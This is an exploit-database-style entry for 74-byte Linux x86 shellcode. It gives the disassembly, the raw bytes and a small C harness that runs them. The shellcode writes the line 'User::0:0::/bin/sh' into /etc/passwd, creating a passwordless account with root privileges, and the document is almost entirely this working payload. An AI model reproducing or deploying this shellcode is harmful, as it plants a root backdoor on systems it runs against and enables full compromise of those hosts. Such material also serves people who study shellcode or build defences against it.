# Exploit Title: Linux/x86 - adduser 'User' to /etc/passwd ShellCode (74 bytes)
# Date: 2019-10-12
# Author: bolonobolo
# Vendor Homepage: None
# Software Link: None
# Tested on: Linux x86
# Comments: add user "User" to /etc/passwd
# CVE: N/A

/*
00000000  31DB              xor ebx,ebx
00000002  31C9              xor ecx,ecx
00000004  66B90104          mov cx,0x401
00000008  F7E3              mul ebx
0000000A  53                push ebx
0000000B  6873737764        push dword 0x64777373
00000010  68632F7061        push dword 0x61702f63
00000015  682F2F6574        push dword 0x74652f2f
0000001A  8D1C24            lea ebx,[esp]
0000001D  B005              mov al,0x5
0000001F  CD80              int 0x80
00000021  93                xchg eax,ebx
00000022  F7E2              mul edx
00000024  686E2F7368        push dword 0x68732f6e
00000029  683A2F6269        push dword 0x69622f3a
0000002E  68303A3A2F        push dword 0x2f3a3a30
00000033  683A3A303A        push dword 0x3a303a3a
00000038  6855736572        push dword 0x72657355
0000003D  8D0C24            lea ecx,[esp]
00000040  B214              mov dl,0x14
00000042  B004              mov al,0x4
00000044  CD80              int 0x80
00000046  2C13              sub al,0x13
00000048  CD80              int 0x80



*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xdb\x31\xc9\x66\xb9\x01\x04\xf7\xe3\x53"
"\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68"
"\x2f\x2f\x65\x74\x8d\x1c\x24\xb0\x05\xcd\x80"
"\x93\xf7\xe2\x68\x6e\x2f\x73\x68\x68\x3a\x2f"
"\x62\x69\x68\x30\x3a\x3a\x2f\x68\x3a\x3a\x30"
"\x3a\x68\x55\x73\x65\x72\x8d\x0c\x24\xb2\x14"
"\xb0\x04\xcd\x80\x2c\x13\xcd\x80";

void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}